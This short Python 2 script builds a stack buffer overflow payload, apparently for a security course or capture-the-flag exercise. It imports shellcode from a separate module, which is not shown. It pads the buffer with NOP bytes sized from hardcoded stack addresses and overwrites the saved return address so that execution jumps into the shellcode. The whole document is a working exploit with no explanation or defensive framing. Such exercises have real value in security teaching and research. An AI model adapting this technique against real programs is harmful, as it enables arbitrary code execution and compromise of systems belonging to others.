from shellcode import shellcode
from struct import pack

ebp = 0xbffef468
buf = 0xbffef3fc

padding = '\x90' * (ebp - buf + 4 - len(shellcode))

print shellcode + padding + pack("<I", buf)
